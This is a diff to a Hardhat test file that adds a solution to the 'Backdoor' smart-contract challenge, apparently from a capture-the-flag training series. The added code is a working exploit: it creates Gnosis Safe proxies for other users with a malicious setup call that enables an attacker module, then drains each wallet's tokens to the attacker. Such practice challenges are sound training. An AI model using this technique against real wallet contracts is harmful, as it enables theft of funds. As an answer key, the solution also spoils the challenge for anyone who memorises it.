@@ -1,6 +1,12 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
+let encodeTokenTransfer = (token, to, amount) => {
+    return token.interface.encodeFunctionData("transfer", [to, amount])
+}
+
+
 describe('[Challenge] Backdoor', function () {
     let deployer, users, attacker;
 
@@ -37,6 +43,68 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let attackerProxyRegistryInstance = this.walletFactory.connect(attacker)
+        
+        for(let i = 0; i < users.length; i++) {
+
+            let attackerProxy = await (await ethers.getContractFactory('AttackerBackdoor', attacker)).deploy()
+
+            let encodeEnableModule = this.masterCopy.interface.encodeFunctionData(
+                "enableModule", [attackerProxy.address]
+            )
+
+            let encodeEnableModuleProxy =attackerProxy.interface.encodeFunctionData(
+                "enableModuleOnProxy", [encodeEnableModule]
+            )
+            
+            let encodedSetUp = this.masterCopy.interface.encodeFunctionData(
+                "setup",
+                [
+                    [users[i]],
+                    1,
+                    attackerProxy.address,
+                    encodeEnableModuleProxy,
+                    "0x0000000000000000000000000000000000000000",
+                    "0x0000000000000000000000000000000000000000",
+                    0,
+                    "0x0000000000000000000000000000000000000000"
+                ]
+            )
+            
+            let tx = await attackerProxyRegistryInstance.createProxyWithCallback(this.masterCopy.address, encodedSetUp, i, this.walletRegistry.address)
+            let proxy = await tx.wait()
+            let proxyAddress
+            proxy.events.map(eventEmitted => {
+                if(eventEmitted.topics[0] == ethers.utils.id('ProxyCreation(address,address)')) {
+                    let decodedEvent = attackerProxyRegistryInstance.interface.decodeEventLog('ProxyCreation', eventEmitted.data, eventEmitted.topics)
+                    proxyAddress = decodedEvent.proxy
+                }
+            })
+            let tokenBalance = await this.token.balanceOf(proxyAddress)
+            let tokenData = encodeTokenTransfer(this.token, attacker.address, tokenBalance)
+            let txData = this.masterCopy.interface.encodeFunctionData("execTransactionFromModule",
+                [
+                    this.token.address,
+                    ethers.utils.parseEther("0"),
+                    tokenData,
+                    0
+                ]                
+            )
+            let attackerProxyData = attackerProxy.interface.encodeFunctionData("exploit",
+                [
+                    proxyAddress,
+                    txData
+                ]
+            )
+
+            let retrieveTx = await attacker.sendTransaction({
+                to: attackerProxy.address,
+                data: attackerProxyData,
+                gasLimit: ethers.BigNumber.from("5000000")
+              })
+
+            await retrieveTx.wait()
+        }
     });
 
     after(async function () {
